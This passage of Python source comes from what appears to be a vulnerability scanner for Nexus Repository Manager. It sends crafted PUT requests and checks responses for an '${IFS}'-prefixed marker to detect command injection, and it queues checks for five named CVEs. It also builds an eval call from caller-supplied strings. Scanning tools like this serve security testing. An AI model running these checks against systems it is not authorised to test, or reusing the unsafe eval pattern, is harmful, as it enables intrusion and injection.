                vul_info['path'] = path
                vul_info['data'] = data
                vul_info['target'] = target

                res2 = requests.put(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG

                if (self.md in check.check_res(res2.text, '${IFS}'+self.md)
                    or (self.md in check.check_res(res2.text, '/'+self.md))
                ):
                    results = {
                        'Target': target,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request': res2
                    }
                    return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None


    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_7238_scan, url=url),
            thread(target=self.cve_2020_10199_scan, url=url),
            thread(target=self.cve_2020_10204_scan, url=url),
            thread(target=self.cve_2019_5475_scan, url=url),
            thread(target=self.cve_2019_15588_scan, url=url)
        ]

nexus = Nexus()
